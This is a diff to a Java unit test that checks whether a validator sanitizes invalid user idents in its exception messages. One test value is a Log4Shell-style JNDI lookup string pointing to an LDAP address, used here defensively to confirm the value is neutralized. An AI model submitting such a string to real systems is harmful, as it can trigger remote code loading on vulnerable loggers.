@@ -70,6 +70,24 @@ class PostFoerstesideRequestValidatorTest {
 		assertDoesNotThrow(() -> validator.validate(request, defaultHeaders));
 	}
 
+	@ParameterizedTest
+	@MethodSource
+	void shouldThrowSanitizedExceptionWhenBrukerIdInvalid(String brukerId, String expectedBrukerIdMessage) {
+		PostFoerstesideRequest request = createRequestWithBrukerId(brukerId);
+
+		assertThatExceptionOfType(BrukerIdIkkeValidException.class)
+				.isThrownBy(() -> validator.validate(request, defaultHeaders))
+				.withMessage("Validering av ident feilet. brukerId=" + expectedBrukerIdMessage + ", brukerType=PERSON. Kunne ikke opprette førsteside.");
+	}
+
+	private static Stream<Arguments> shouldThrowSanitizedExceptionWhenBrukerIdInvalid() {
+		return Stream.of(
+				Arguments.of("111111111111", "11111111111"),
+				Arguments.of("${jndi:ldap://example.com/file}", "__jndi_ldap")
+		);
+	}
+
+
 	@Test
 	void shouldThrowExceptionIfSpraakkodeIsNull() {
 		PostFoerstesideRequest request = PostFoerstesideRequest.builder()
